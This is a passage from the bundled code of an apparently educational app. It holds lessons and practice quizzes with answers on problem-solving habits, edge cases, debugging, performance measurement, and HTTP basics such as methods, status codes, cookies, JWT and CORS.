└─ Send confirmation email`},{type:"compare",left:{title:"Layer by layer ⚠️",items:["All tables, then all APIs, then all UI","Nothing works until the end","Problems are found late"]},right:{title:"Thin slices ✅",items:["One small feature, DB to UI","Something works on day 1","Feedback comes early"]}},{type:"text",text:"Solve the **simplest version first**. Make it work for 10 items in memory before 10 million from a file. Then grow it."},{type:"text",text:"Do the **riskiest part early**. If one step uses an API nobody on the team knows, try it first. Bad news is cheaper in week 1 than in week 4."},{type:"example",title:"Stuck?",text:`Name the next smallest step you can test.
"Import the CSV" is hard to start. "Read one row from the file and print it" takes 10 minutes.`}],remember:"Small steps you can check beat big steps you hope will work.",questions:[{id:"thinking.break-down.1",kind:"scenario",difficulty:"medium",prompt:'You must build "import customers from CSV" in 3 days. Which first step is best?',choices:["Design a generic import framework for any file type","Build the full upload UI with a progress bar","Design the database schema for all future imports","Read one real sample file and print the parsed rows"],answer:3,why:"Reading the real file tests the biggest unknowns (format, encoding, strange rows) in an hour. The framework and the UI can wait."},{id:"thinking.break-down.2",kind:"compare",difficulty:"medium",prompt:'Two plans for a new "comments" feature. Which gives you working software and feedback sooner?',choices:['Build "add a comment and see it" end to end, then edit, then delete',"Build all the tables, then all the endpoints, then all the screens"],answer:0,why:'A thin slice works end to end after a day or two. People can try it and say "that is not what I meant" early. Layer by layer shows nothing until the end.',remember:"Slice vertically, not by layer."},{id:"thinking.break-down.3",kind:"mcq",difficulty:"easy",prompt:'Your estimate for a task is "about 2 weeks, not sure". What usually makes it more reliable?',choices:["Multiply it by 3 to add a safe buffer, then promise that date","Split it into pieces of a day or less and estimate each","Ask an AI tool to estimate it from the ticket title and summary","Start coding right away and see how far you get in two days"],answer:1,why:"Small pieces are easier to imagine and estimate. Splitting also shows the parts you do not understand yet — those are where estimates go wrong."},{id:"thinking.break-down.4",kind:"scenario",difficulty:"hard",prompt:"You split a feature into 6 tasks. Task 4 uses an external API nobody on the team has used before. What order makes the most sense?",choices:["Do tasks 1–3 first, then handle task 4 when you reach it","Try a small test call to the unknown API early","Skip task 4 and hope the API is simple","Ask for two more developers just in case"],answer:1,why:"Unknowns are where plans break. Test the risky part early with a small call. Then bad news arrives while you still have time to change the plan.",remember:"Do the riskiest part first."}]},{id:"thinking.edge-cases",title:"Edge cases: where bugs live",summary:"Empty, one, many, the limit, twice.",minutes:4,blocks:[{type:"text",text:'Code usually works for "normal" input. Bugs hide at the **edges**: empty, huge, wrong, or exactly at a limit. These unusual inputs are called **edge cases**.'},{type:"list",items:["**Zero / empty** — empty list, empty string, `0`, `null`.","**One** — a single item.","**Many** — 1 million items.","**Boundaries** — first, last, exactly at the limit (`<` vs `<=`).","**Bad input** — negative numbers, wrong format, very long text, emoji.","**Time** — midnight, time zones, daylight saving, Feb 29.","**Twice** — the same request sent two times."]},{type:"code",code:{lang:"ts",text:`function average(nums: number[]): number {
  const sum = nums.reduce((a, b) => a + b, 0);
  return sum / nums.length;
}

average([4, 6]); // 5
average([]);     // NaN  ← 0 / 0`}},{type:"text",text:`For each edge case, **decide on purpose**: return a default, throw a clear error, or reject the input.
The edge case is not the bug. **Not deciding** is the bug.`}],remember:'Test empty, one, many, the limit, and "sent twice".',questions:[{id:"thinking.edge-cases.1",kind:"code",difficulty:"easy",prompt:"What happens when this method gets an empty list?",code:{lang:"csharp",text:`int Max(List<int> items)
{
    var max = items[0];
    foreach (var x in items)
        if (x > max) max = x;
    return max;
}`},choices:["It returns 0, the default value of int","It throws ArgumentOutOfRangeException","It returns int.MinValue because the loop never runs","It throws NullReferenceException on items[0]"],answer:1,why:'`items[0]` on an empty `List<int>` throws. Decide what "max of nothing" means: throw a clear error, or return a nullable / default.'},{id:"thinking.edge-cases.2",kind:"code",difficulty:"medium",prompt:'The rule is: "Orders of 100 or more get free shipping." Which order total shows the bug?',code:{lang:"ts",text:"const freeShipping = total > 100;"},choices:["50","100","150","0"],answer:1,why:'"100 or more" means `>= 100`. With `> 100`, an order of exactly 100 pays for shipping. Always test the exact boundary value.',remember:"Test exactly at the limit."},{id:"thinking.edge-cases.3",kind:"scenario",difficulty:"medium",prompt:'A "Pay" button sends `POST /payments`. Users on slow mobile networks tap it twice. Which edge case must you handle?',choices:["Card numbers that are too long","Users who use dark mode","The same payment request arriving twice","Users who never open the page"],answer:2,why:"Two taps can mean two charges. Disable the button after the first tap. Also make the server safe. For example, send an **idempotency key**: a unique ID for each payment. The server then processes a repeated request only once.",remember:"Ask: what if this is sent twice?"},{id:"thinking.edge-cases.4",kind:"debug",difficulty:"hard",prompt:'An hourly chart of orders "per local day" looks fine almost every day. But on one day in spring it shows 23 bars, and on one day in autumn it shows 25. What is the most likely cause?',choices:["Daylight saving time changes the length of the local day","Leap years add a day in February, which moves the hour groups","The server clock runs wrong on those days and logs the wrong hour","The chart library rounds timestamps and merges or splits bars"],answer:0,why:'In time zones with daylight saving, one local day has 23 hours and another has 25. Store times in UTC and decide clearly which time zone "a day" means.'}]},{id:"thinking.trade-offs",title:"Trade-offs: every choice has a cost",summary:"Every choice makes something better and something worse.",minutes:3,blocks:[{type:"text",text:'Almost every technical choice improves one thing and hurts another. Experienced developers do not say "X is the best". They say "X is better **here**, because…".'},{type:"diagram",text:`Faster reads   ⇄  slower writes   (indexes)
Speed          ⇄  fresh data      (caching)
Flexible       ⇄  simple          (config, plugins)
Ship today     ⇄  clean code      (tech debt)
Less memory    ⇄  more CPU        (store vs recompute)`},{type:"text",text:`Two questions help you choose:
1. **What matters most here?** Speed, cost, correctness, time to ship?
2. **How hard is it to undo?** Easy-to-undo choices can be made fast. Hard-to-undo ones (database, public API shape) deserve more thought.`},{type:"example",title:"Same tool, different answer",text:`Caching product prices for 5 minutes cuts database load a lot. But a price change can take 5 minutes to show.
For a blog shop: great. For a trading app: not acceptable.`},{type:"text",text:'Write the trade-off down, even in one line in the PR: "Chose X over Y because Z. Downside: W." Months later, you and your team will still know why.'}],remember:'"It depends" is only a good answer if you say on what.',questions:[{id:"thinking.trade-offs.1",kind:"compare",difficulty:"medium",prompt:"A product page gets 5,000 views per second. Prices change about twice a day, and the business is fine with a short delay. Which is better?",choices:["Cache prices for 60 seconds","Read prices from the database on every request"],answer:0,why:'Prices rarely change, so a delay of up to 60 seconds is acceptable here. The database also does far less work. The words "the business is fine with a short delay" make this the right choice.'},{id:"thinking.trade-offs.2",kind:"scenario",difficulty:"medium",prompt:'A teammate says: "Let’s make every setting configurable. Then we never need to change code again." What is the hidden cost?',choices:["None — more options always make the product more flexible","Reading config files at startup is slower than hard-coded values","More combinations to test, and more ways to break production","Users will be able to read the config and see internal settings"],answer:2,why:"Each option doubles the possible combinations. Many of them are never tested, and a wrong value in production can break things just like a bad deploy."},{id:"thinking.trade-offs.3",kind:"mcq",difficulty:"hard",prompt:"Which decision needs the most careful thought before you start?",choices:["The name of a private helper method","The logging library used inside one module","The order of CSS classes on a button","The shape of a public API used by 30 external clients"],answer:3,why:"You can rename a private method in a minute. Changing a public API means 30 other teams must change their code. The harder to undo, the more thought it deserves.",remember:"Think harder about decisions that are hard to undo."},{id:"thinking.trade-offs.4",kind:"scenario",difficulty:"easy",prompt:"The deadline is Friday. You find a quick fix that works, but it copies some logic from another file. What is a good choice?",choices:["Ship it, and create a ticket to remove the copy later","Miss the deadline to refactor the whole module","Ship it and tell nobody about the copy","Refuse to ship until the code is perfect"],answer:0,why:"A little **tech debt** (a shortcut you must clean up later) can be the right trade-off. The key is to make it visible. Then someone fixes it later, and it is not forgotten."}]},{id:"thinking.debugging-mindset",title:"Debug like a scientist",summary:"Guess, test, repeat — not random changes.",minutes:4,blocks:[{type:"text",text:'Changing random things ("let me try this…") is slow and often hides the real bug. Treat a bug like an **experiment**.'},{type:"diagram",text:`1. Reproduce  → make it fail on purpose
2. Observe    → read the error, logs, data
3. Guess      → ONE idea: "X causes it"
4. Test       → change one thing, check again
5. Repeat     → until the idea is proven
6. Fix + test → add a test so it stays fixed`},{type:"text",text:"**Read the whole error message.** The message says **what** failed. The stack trace says **where**. Many people skip it and start guessing."},{type:"text",text:'Ask "**What changed?**" Code, config, data, traffic, library versions, the date. A bug that seems to have no reason usually has its cause somewhere in that list.'},{type:"example",title:"Binary search for the bad commit",text:"It worked last week. Today it is broken. There are 40 commits in between.\nTest the commit in the middle. Broken? The bug is in the first half. Works? The second half. About 6 checks find the bad commit. `git bisect` does this for you."}],remember:"Reproduce. One guess at a time. Change one thing at a time.",questions:[{id:"thinking.debugging-mindset.1",kind:"scenario",difficulty:"easy",prompt:"A bug happens in production but not on your machine. What is the best first step?",choices:["Change the code and redeploy until the bug goes away","Collect facts: logs, the exact input, what differs from local","Restart the production servers and hope",'Close the ticket as "cannot reproduce"'],answer:1,why:"You cannot fix what you do not understand. The difference between production and local (data, config, versions, load) usually points to the cause."},{id:"thinking.debugging-mindset.2",kind:"scenario",difficulty:"medium",prompt:"You change three things at once and the bug disappears. What is the problem?",choices:["There is no problem — the bug is gone, so the fix is done","Three changes make the commit too large for a code review","The bug will surely come back, because big fixes never last","You do not know which change fixed it; the others may add bugs"],answer:3,why:"With three changes you have no proof of the cause. Two of them may be useless or harmful. Change one thing, check, then decide.",remember:"One change per experiment."},{id:"thinking.debugging-mindset.3",kind:"debug",difficulty:"medium",prompt:"A feature worked on Monday. On Thursday it is broken. Nobody changed that feature’s code. What helps most?",choices:["Rewrite the whole feature so the code is clean and safe","List what else changed: config, data, libraries, other deploys","Ask every user to clear their browser cache and log in again","Read the feature’s code line by line until you find the bug"],answer:1,why:"Code is only one thing that can change. A new config value, a library update, or new kinds of data can break code that was not touched."},{id:"thinking.debugging-mindset.4",kind:"mcq",difficulty:"hard",prompt:"There are 64 commits between the last good version and the broken one. Each test takes 5 minutes. With binary search, about how many tests do you need?",choices:["64","32","About 6","Exactly 1"],answer:2,why:"Each test cuts the list in half: 64 → 32 → 16 → 8 → 4 → 2 → 1. That is 6 tests, about 30 minutes instead of more than 5 hours."}]},{id:"thinking.measure-first",title:"Measure before you optimize",summary:"The slow part is rarely where you think.",minutes:4,blocks:[{type:"text",text:"Developers are often bad at guessing which part is slow. So **measure first**, then optimize the biggest cost."},{type:"example",title:"The week that saved 2 ms",text:"A team spent a week making JSON serialization 2× faster. Later they measured the request. It took 800 ms: one SQL query took 750 ms, and JSON took only 5 ms. They saved about 2.5 ms."},{type:"diagram",text:`Request: 800 ms
├─ DB query        750 ms  ███████████████
├─ Auth API call    40 ms  █
├─ Business logic    5 ms
└─ JSON              5 ms
→ Fix the biggest bar first.`},{type:"list",items:['**Measure** the current numbers. Not "it feels slow".',"**Find the biggest cost** with a profiler, traces or query stats.","**Change one thing.**","**Measure again** with the same data and conditions.","**Stop** when you reach the target."]},{type:"text",text:"Look at **percentiles**, not only the average. **p95 = 500 ms** means 95% of requests are faster than 500 ms, and 5% are slower. An average can look fine while some users wait a long time."}],remember:"No numbers, no optimization. Fix the biggest bar first.",questions:[{id:"thinking.measure-first.1",kind:"perf",difficulty:"easy",prompt:"An endpoint takes 2 seconds. A trace shows: external API call 1.7 s, database 0.2 s, your C# code 0.1 s. Where do you look first?",choices:["Rewrite the C# loops, because your own code is easiest to change","Add a database index, since queries are usually the bottleneck","The external API call: cache, batch or parallelize it","Upgrade the server CPU so every part of the request runs faster"],answer:2,why:"The external call is 85% of the time. Even making your C# code 10× faster saves only 0.09 s.",remember:"Optimize the biggest part of the trace."},{id:"thinking.measure-first.2",kind:"perf",difficulty:"medium",prompt:"The average response time is 120 ms, which looks fine. But some users complain the app is slow. What do you check next?",choices:["p95 and p99 latency — slow requests hide in the average","Nothing — 120 ms is fast, so the complaints are about something else","The median response time, to see what a typical user gets","The application log level, to see if logging slows it down"],answer:0,why:'If 98 requests take 50 ms and 2 take 3.5 s, the average is about 120 ms. Percentiles show the slowest requests (the "tail"), and real users feel those.'},{id:"thinking.measure-first.3",kind:"scenario",difficulty:"medium",prompt:'You optimized a function and it "feels faster". How do you show it really is?',choices:["Ask a colleague if it feels faster to them","Run the same benchmark before and after, with the same data","Check that the new code has fewer lines","Run it once in debug mode and look at the clock"],answer:1,why:"Only a repeatable measurement under the same conditions is evidence. Feelings, line counts and single runs are not."},{id:"thinking.measure-first.4",kind:"mcq",difficulty:"hard",prompt:"A request takes 1,000 ms. Function F takes 100 ms of that. You make F 10× faster. How long does the request take now?",choices:["100 ms","910 ms","500 ms","990 ms"],answer:1,why:"F goes from 100 ms to 10 ms, so you save 90 ms: 1,000 − 90 = 910 ms. Speeding up a small part only helps a little.",remember:"The total gain is limited by how big the part is."}]}],cheatSheet:[{title:"Before coding",items:[{term:"Say it back",meaning:"Repeat the problem in your words — catch misunderstandings early"},{term:"Examples first",meaning:"Write 2–3 input → output pairs, one of them weird"},{term:"Definition of done",meaning:"How will we know it works? Use numbers where possible"},{term:"Thin slice",meaning:"One small feature end to end, instead of layer by layer"},{term:"Riskiest first",meaning:"Test unknown APIs / libraries early"}]},{title:"Edge case checklist",items:[{term:"Empty / null / 0",meaning:"What happens with nothing?"},{term:"One / many",meaning:"A single item? A million items?"},{term:"Boundary",meaning:"Exactly at the limit — `<` vs `<=`"},{term:"Bad input",meaning:"Negative, too long, wrong format, emoji"},{term:"Time",meaning:"Midnight, time zones, daylight saving, Feb 29"},{term:"Twice",meaning:"Same request sent again → make it idempotent (safe to repeat)"}]},{title:"Debugging & performance",items:[{term:"Reproduce first",meaning:"Make it fail on purpose before fixing"},{term:"One change at a time",meaning:"Otherwise you do not know what fixed it"},{term:"What changed?",meaning:"Code, config, data, versions, traffic, date"},{term:"Binary search / git bisect",meaning:"Each test cuts the list of commits in half"},{term:"Measure → fix → measure",meaning:"Biggest cost first, same conditions each time"},{term:"p95 / p99",meaning:"The slowest requests, which the average hides"}]},{title:"Trade-offs",items:[{term:"Cache",meaning:"Faster reads, but data can be old (stale)"},{term:"Index",meaning:"Faster reads, slower writes"},{term:"Configurable",meaning:"Flexible, but more combinations to test"},{term:"Hard to undo",meaning:"Public APIs, data models → think longer"}]}]},ye=Object.freeze(Object.defineProperty({__proto__:null,default:ge},Symbol.toStringTag,{value:"Module"})),fe={id:"web",title:"Web & HTTP",emoji:"🌐",tagline:"Requests, status codes, cookies, CORS — how the web talks",lessons:[{id:"web.request-response",title:"One request, one response",summary:"What really travels between browser and server.",minutes:3,blocks:[{type:"text",text:`**HTTP** is how a browser or an app talks to a server.
The client sends a **request**. The server sends back one **response**. Then that exchange is finished.`},{type:"code",code:{lang:"http",text:`GET /api/orders/42?expand=items HTTP/1.1
Host: shop.example.com
Accept: application/json
Authorization: Bearer eyJhbGciOi...`}},{type:"code",code:{lang:"http",text:`HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{"id": 42, "total": 50, "items": [...]}`}},{type:"diagram",text:`Request  = method + URL + headers + (body)
Response = status code + headers + (body)

URL = /api/orders/42  ?expand=items
      └── path ──────┘ └ query string`},{type:"text",text:'HTTP is **stateless**. Each request stands alone. The server does not "remember" you between requests. If the server needs to know who you are, each request must carry that info. It uses a **cookie** or a **token**.'},{type:"example",title:"Your best debugging tool",text:'Open DevTools → **Network** tab. Every API call is one request/response pair. You can see the method, URL, headers, body, status code and timing. When "the API is broken", look here first.'}],remember:"HTTP = request in, response out. Each request stands alone.",questions:[{id:"web.request-response.1",kind:"mcq",difficulty:"easy",prompt:"HTTP is **stateless**. What does that mean for your app?",choices:["The server must not keep any data, not even in a database","Each request must bring its own context, like a cookie or token","The browser may not cache responses, so each one is fresh","Each request opens a new connection that closes right after"],answer:1,why:'The protocol does not remember earlier requests. Apps add "memory" by sending a cookie or token with every request. The server can still store data in a database.'},{id:"web.request-response.2",kind:"debug",difficulty:"easy",prompt:"A user clicks **Save**. Nothing happens and no error is shown. What is the fastest way to see what actually happened?",choices:["Restart the web server and ask the user to try again","Ask the user to clear cookies and cache, then log in again","Check the request, status code and response in the Network tab","Add console.log calls to the Save handler and redeploy"],answer:2,why:'The Network tab shows if a request was sent at all, what status came back (400? 500?) and the error body. That turns "nothing happens" into a real clue.',remember:"Silent bug in the UI → open the Network tab."},{id:"web.request-response.3",kind:"code",difficulty:"medium",prompt:"The server reads `qty` from the query string and always gets nothing. Why?",code:{lang:"http",text:`POST /api/cart?notify=true HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{"productId": 7, "qty": 2}`},choices:["`qty` is in the JSON body, not in the query string","POST requests cannot have a query string","The `Host` header is wrong","JSON numbers must be sent as strings"],answer:0,why:"Only `notify=true` is in the query string. `qty` lives in the body. The server must read the body (for example `[FromBody]` in ASP.NET Core)."}]},{id:"web.methods",title:"HTTP methods and REST",summary:"GET, POST, PUT, PATCH, DELETE — and which ones are safe to repeat.",minutes:4,blocks:[{type:"text",text:`The **method** says what you want to do.
**REST** is a common API style. The URL names a **thing** (a resource, like an order). The method is the **action**.`},{type:"code",code:{lang:"http",text:`GET    /api/orders       list orders
GET    /api/orders/42    read order 42
POST   /api/orders       create a new order
PUT    /api/orders/42    replace order 42 completely
PATCH  /api/orders/42    change some fields of order 42
DELETE /api/orders/42    delete order 42`}},{type:"diagram",text:`Method  Safe?  Idempotent?
GET     yes    yes
PUT     no     yes
DELETE  no     yes
POST    no     no
PATCH   no     not guaranteed`},{type:"list",items:["**Safe** = does not change data. Just reading.","**Idempotent** = sending it 1 time or 5 times leaves the server in the same state.",'`PUT /users/7 {"name":"Ann"}` five times → still one user called Ann.',"`POST /orders` five times → five orders. 😬"]},{type:"example",title:"Why it matters",text:"Browsers, proxies (servers between the client and your app) and retry libraries may repeat a GET or PUT without asking. They should not repeat a POST without care. Bots also open GET links all the time (link previews, crawlers, prefetch). So a GET must never change data."}],remember:"GET reads, POST creates, PUT replaces, PATCH changes part, DELETE removes. Idempotent = safe to repeat.",questions:[{id:"web.methods.1",kind:"scenario",difficulty:"medium",prompt:"A mobile app on bad Wi-Fi sends a request, gets a timeout, and automatically sends it again. Which request is the most dangerous to repeat?",choices:["`GET /api/orders/42`","`PUT /api/users/7` with the full profile","`POST /api/payments`","`DELETE /api/cart/items/3`"],answer:2,why:"POST is not idempotent. If the first request actually reached the server, the retry can create a second payment. GET, PUT and DELETE leave the same final state when repeated.",remember:"Timeout + retry + POST = possible duplicate."},{id:"web.methods.2",kind:"truefalse",difficulty:"medium",prompt:"`DELETE /api/orders/42` returns `204` the first time and `404` the second time. So DELETE is **not** idempotent.",choices:["True","False"],answer:1,why:"Idempotency is about the server state, not the exact response. After one call or ten calls, order 42 is gone. The different status code is fine."},{id:"web.methods.3",kind:"debug",difficulty:"hard",prompt:"User accounts disappear. Logs show `GET /admin/deleteUser?id=...` calls coming from a chat app's link preview bot. An admin had pasted the links in chat. What is the design mistake?",choices:["The bot should be blocked by IP address","The user ids should be GUIDs","The admin page should use a nicer UI","A GET request changes data"],answer:3,why:"GET must be safe: bots, crawlers and browsers open GET links without asking. Deleting must use DELETE (or POST) and require an authorized user.",remember:"GET never changes data."},{id:"web.methods.4",kind:"compare",difficulty:"medium",prompt:"You want to change **only** the email of user 7. Which request fits best?",choices:['`PATCH /api/users/7` with `{"email":"a@b.com"}`','`PUT /api/users/7` with `{"email":"a@b.com"}`',"`GET /api/users/7?email=a@b.com`","`POST /api/updateUserEmail7`"],answer:0,why:'PATCH means "change these fields". PUT means "replace the whole resource with this", so a PUT with only an email may clear the other fields. GET must not change data.'}]},{id:"web.status-codes",title:"Status codes: what the server is telling you",summary:"The 3-digit number that tells you whose fault it is.",minutes:4,blocks:[{type:"text",text:"Every response starts with a **status code**. The first digit tells you the group."},{type:"diagram",text:`2xx  Success       it worked
3xx  Redirect      look somewhere else
4xx  Client error  the REQUEST is wrong
5xx  Server error  the SERVER failed`},{type:"list",items:["`200 OK` · `201 Created` (POST made something) · `204 No Content` (done, nothing to return)","`304 Not Modified` — your cached copy is still good","`400 Bad Request` — invalid input · `404 Not Found` · `409 Conflict` — conflicts with the current state","`429 Too Many Requests` — slow down (rate limit)","`500` — bug or crash in the server · `503` — temporarily unavailable","`502 / 504` — the proxy in front of your app got a bad answer (502) or no answer in time (504)"]},{type:"compare",left:{title:"401 Unauthorized",items:['"Who are you? I do not know you."',"Missing, expired or invalid token","Fix: log in again / refresh the token"]},right:{title:"403 Forbidden",items:['"I know who you are."',"But you are not allowed to do this","Logging in again will not help"]}},{type:"text",text:'Return **honest** status codes. `200 OK` with `{"error": "not found"}` in the body fools monitoring, caches and retry logic. They all see "success".'}],remember:"4xx = fix the request. 5xx = fix the server. 401 = who are you? 403 = not allowed.",questions:[{id:"web.status-codes.1",kind:"scenario",difficulty:"easy",prompt:"A normal (non-admin) user with a **valid** token calls `DELETE /api/admin/users/9`. Which status code fits best?",choices:["401 Unauthorized","403 Forbidden","500 Internal Server Error","201 Created"],answer:1,why:'The server knows who the user is (valid token), but they do not have permission. That is 403. 401 would mean "I do not know who you are".',remember:"401 = not logged in. 403 = logged in, not allowed."},{id:"web.status-codes.2",kind:"debug",difficulty:"medium",prompt:"Every morning, users see their API calls fail with `401` about an hour after they log in. Logging in again fixes it. What is the most likely cause?",choices:["The database connection pool times out after an hour","A background job removes the user's role every hour","The access token expires and the app never refreshes it","The CORS policy is cached for an hour, then blocks calls"],answer:2,why:"401 means the server no longer accepts who you are. A token that expires after 60 minutes, with no refresh logic, matches the pattern exactly. A lost role would give 403."},{id:"web.status-codes.3",kind:"mcq",difficulty:"medium",prompt:'An API returns `200 OK` with the body `{"success": false, "error": "Order not found"}`. What is the main problem?',choices:['Tools see "success"; it should be a 404',"The JSON keys should be in PascalCase","Nothing, status codes only matter for browsers","The body should always be empty on errors"],answer:0,why:"Monitoring, caches, retry libraries and frontend code all trust the status code first. Hiding errors behind 200 makes failures invisible."},{id:"web.status-codes.4",kind:"debug",difficulty:"hard",prompt:"Users get `502 Bad Gateway`. Your API logs show **no errors and no incoming requests** during that time. What is most likely?",choices:["A null reference bug in your controller","The users sent invalid JSON","The proxy in front could not reach your app","The users' tokens have expired"],answer:2,why:"502 comes from a proxy or load balancer that got no valid answer from the app behind it. If your app logged nothing, the request probably never reached it: app down, crashed, or wrong port.",remember:"502/504 = look at the proxy and check that the app is running."}]},{id:"web.headers-cookies",title:"Headers, cookies and sessions",summary:"How a stateless protocol remembers who you are.",minutes:4,blocks:[{type:"text",text:"**Headers** are `Name: value` lines with extra info about the request or response. A few you will see every day:"},{type:"list",items:["`Content-Type` — format of the body (`application/json`)","`Accept` — formats the client wants back","`Authorization` — credentials, for example `Bearer <token>`","`Cache-Control` — may this response be cached, and for how long","`Set-Cookie` (response) / `Cookie` (request) — cookies"]},{type:"text",text:"A **cookie** is a small value the server asks the browser to keep. The browser then sends it back **automatically** with matching requests to that site."},{type:"code",code:{lang:"http",text:`HTTP/1.1 200 OK
Set-Cookie: sid=a8f3k2; HttpOnly; Secure; SameSite=Lax; Path=/

--- later, the browser sends: ---
GET /api/cart HTTP/1.1
Cookie: sid=a8f3k2`}},{type:"list",items:["`HttpOnly` — page JavaScript cannot read it (`document.cookie`)","`Secure` — only sent over HTTPS","`SameSite` — is it sent when another site starts the request? (`Strict` / `Lax` / `None`)","`Expires` / `Max-Age` — without them, the cookie disappears when the browser closes"]},{type:"diagram",text:`Browser            Server          Session store
  │ POST /login ──────►│                    │
  │                    │── save a8f3 ──────►│
  │                    │   {userId: 7}      │
  │◄─ Set-Cookie: a8f3 │                    │
  │ GET /cart          │                    │
  │ Cookie: a8f3 ─────►│── find a8f3 ──────►│`},{type:"text",text:"A **session** = data kept on the **server**. The cookie only holds a random id. Users can see and edit their cookies, so never trust a cookie value like `isAdmin=true`."}],remember:"Cookie = small value the browser sends back automatically. Session = data on the server, found by the id in the cookie.",questions:[{id:"web.headers-cookies.1",kind:"debug",difficulty:"medium",prompt:"You scaled the app from 1 to 3 servers behind a load balancer. Now users are randomly logged out. Sessions are stored in each server's memory. Why?",choices:["Cookies stop working with more than one server","Some requests hit a server that does not have that session","The load balancer deletes all cookies","HTTPS was turned off on the new servers"],answer:1,why:"The cookie still arrives, but server B has never seen session `a8f3`. Use a shared session store (Redis, database) or tokens.",remember:"More than one server → shared session store."},{id:"web.headers-cookies.2",kind:"mcq",difficulty:"medium",prompt:"Your session cookie has the `HttpOnly` flag. What does that protect against?",choices:["A script in the page reading `document.cookie`","Someone reading plain HTTP traffic on the network","Other websites triggering requests with the cookie","The cookie growing too large"],answer:0,why:"HttpOnly hides the cookie from JavaScript. Against reading network traffic, use `Secure` (HTTPS only). Against sending from other sites, use `SameSite`."},{id:"web.headers-cookies.3",kind:"debug",difficulty:"hard",prompt:"The frontend at `https://app.example.com` calls `https://api.example.com` with `fetch`. The API set a session cookie at login, but later API calls arrive **without** the cookie. What is the most likely cause?",choices:["Browsers only attach cookies to GET requests, not POST","The cookie is HttpOnly, so the browser never sends it back","fetch needs `credentials: 'include'` to send cookies to another origin","The API must set the cookie again on every response"],answer:2,why:"By default `fetch` only sends cookies to the same origin. For another origin you need `credentials: 'include'`, and the API must answer with `Access-Control-Allow-Credentials: true`."},{id:"web.headers-cookies.4",kind:"scenario",difficulty:"medium",prompt:"A developer stores `role=admin` in a normal cookie and the server reads it to decide permissions. Is that OK?",choices:["Yes, cookies are set by the server, so they are trusted","Yes, if the cookie is HttpOnly","No, users can edit cookies; keep the role on the server","Yes, if the site uses HTTPS"],answer:2,why:"Anyone can change a cookie in DevTools or send any Cookie header with a script. HttpOnly and HTTPS do not stop the user themselves. Keep the role on the server, or inside a signed token that the server checks.",remember:"Never trust data the client can edit."}]},{id:"web.auth-jwt",title:"Who are you? Auth basics and JWT",summary:"Authentication vs authorization, and what is inside a JWT.",minutes:4,blocks:[{type:"text",text:`**Authentication** = Who are you? (login, password, SSO)
**Authorization** = What are you allowed to do? ("only admins can delete")
Authentication always comes first.`},{type:"diagram",text:`Request ─► Authentication ─► Authorization ─► Handler
           "Who are you?"   "May you do it?"
           fail → 401       fail → 403`},{type:"text",text:"After login, the client must prove who it is on every request. Two common ways: a **session cookie** (last lesson) or a **token** in a header:\n`Authorization: Bearer <token>`"},{type:"text",text:"A **JWT** (JSON Web Token) is a popular token format. Three parts, separated by dots:"},{type:"diagram",text:`xxxxx.yyyyy.zzzzz
  │     │     └ signature: proves the server made it
  │     └ payload: {"sub":"7","role":"user","exp":...}
  └ header: {"alg":"HS256","typ":"JWT"}`},{type:"list",items:["The payload is **base64url-encoded, not encrypted**. Anyone who has the token can decode and read it. Never put secrets in it.","The **signature** lets the server detect any change. Edit one letter of the payload → the check fails.","The server must check the signature **and** `exp` (expiry) on every request.","A JWT stays valid until it expires. Logout does not stop it unless you build something extra for that."]},{type:"compare",left:{title:"Session cookie",items:["Server stores the session","Easy to revoke (cancel): delete the session","Browser sends it automatically"]},right:{title:"JWT bearer token",items:["Server stores nothing per user","Hard to revoke before it expires","Client code adds the header"]}}],remember:"AuthN = who are you (401). AuthZ = what can you do (403). A JWT payload is readable by anyone.",questions:[{id:"web.auth-jwt.1",kind:"mcq",difficulty:"medium",prompt:"You paste a JWT from your app into a JWT decoder website. You can read the `email` and `role` without any key. What does that tell you?",choices:["The token is broken: a valid JWT is encrypted","The signing key has leaked to the decoder site","Normal: the payload is encoded, not encrypted","The token has expired, so its data is now public"],answer:2,why:"Base64url is just an encoding. Anyone can decode it. The signature protects against **changes**, not against **reading**.",remember:"JWT payload = public. Signature = any change is detected."},{id:"web.auth-jwt.2",kind:"scenario",difficulty:"hard",prompt:'A user decodes their JWT, changes `"role":"user"` to `"role":"admin"`, encodes it again and sends it. The server validates tokens correctly. What happens?',choices:["They become admin","The server re-signs the token with the new role","The server ignores the payload and uses the header","The signature no longer matches, so it is rejected"],answer:3,why:"The signature was made from the original header and payload. Without the server's key, the user cannot make a matching signature, so validation fails (401)."},{id:"web.auth-jwt.3",kind:"mcq",difficulty:"medium",prompt:"Which of these is an **authorization** check?",choices:["Is the password correct for this email?","Is the token signature valid for our key?","Is this user the owner of invoice 1043?","Has the token expired or been revoked?"],answer:2,why:'The other three all answer "who are you, really?" (authentication). "May this user access this invoice?" is about permission — authorization.'},{id:"web.auth-jwt.4",kind:"scenario",difficulty:"medium",prompt:"An employee is fired and their account is disabled. Their JWT access token is valid for 7 more days. What is the situation?",choices:["Safe: JWTs stop working when the account is disabled","Safe: the browser deletes the token on logout","Risky: it works until it expires; use short-lived tokens + refresh","Safe: ask the user to clear their browser cache"],answer:2,why:"A server that only checks signature and expiry will accept the token for 7 days. To limit this, use short access tokens (minutes) plus refresh tokens. Or keep a deny list of blocked tokens."}]},{id:"web.cors",title:"CORS: the browser's permission check",summary:"Why it fails in the browser but works in Postman.",minutes:4,blocks:[{type:"text",text:"An **origin** = scheme (`http` / `https`) + host + port.\n`http://localhost:5173` and `http://localhost:5000` are **different** origins. So are `https://app.example.com` and `https://api.example.com`."},{type:"text",text:'Browser JavaScript may send requests to another origin. But it **cannot read the response** unless that server says "this origin is allowed". This permission system is **CORS** (Cross-Origin Resource Sharing).'},{type:"diagram",text:`Browser (app.com)                 API (api.com)
  │ OPTIONS /orders   (preflight)     │
  │ Origin: https://app.com ─────────►│
  │◄─ Access-Control-Allow-Origin:    │
  │     https://app.com               │
  │ POST /orders ────────────────────►│
  │◄─ 201 + Allow-Origin header ──────│`},{type:"text",text:'For some requests, the browser first sends a **preflight**: an `OPTIONS` request that asks "is this allowed?". Common triggers: a JSON body (`Content-Type: application/json`), an `Authorization` header, or methods like PUT and DELETE.'},{type:"code",code:{lang:"csharp",text:`// ASP.NET Core: allow one known frontend
builder.Services.AddCors(o => o.AddPolicy("web", p => p
    .WithOrigins("https://app.example.com")
    .AllowAnyHeader()
    .AllowAnyMethod()));

